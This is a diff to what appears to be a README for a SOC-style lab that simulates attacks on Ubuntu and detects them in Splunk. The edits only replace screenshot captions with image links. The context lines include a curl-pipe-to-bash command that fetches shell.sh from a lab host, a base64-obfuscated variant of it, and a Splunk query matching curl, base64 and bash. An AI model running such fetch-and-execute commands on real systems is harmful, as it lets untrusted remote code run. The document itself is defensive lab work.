@@ -38,14 +38,16 @@ To simulate attacker techniques and detect:
 
 ```bash
 curl http://192.168.1.64:8000/shell.sh | bash
-📸 Evidence (Ubuntu Screenshot)
+📸 Evidence:
+![Attack Screenshot](./images/ubu.png)
 Command executed successfully
 Output observed:
 Malicious script executed
 🔴 Attack 2 — Base64 Obfuscated Execution
 echo "curl http://192.168.1.64:8000/shell.sh | bash" | base64
 echo <BASE64_STRING> | base64 -d | bash
-📸 Evidence (Ubuntu Screenshot)
+📸 Evidence:
+![Attack Screenshot](./images/ubu.png)
 Base64 encoded string generated
 Decoded and executed successfully
 Output observed:
@@ -55,7 +57,8 @@ Malicious script executed
 /var/log/auth.log
 🔎 Splunk Detection Query Used
 index=* ("curl" OR "base64" OR "bash")
-📸 Evidence (Splunk Screenshot)
+📸 Evidence:
+![Attack Screenshot](./images/spk.png)
 
 The following activities were observed:
 
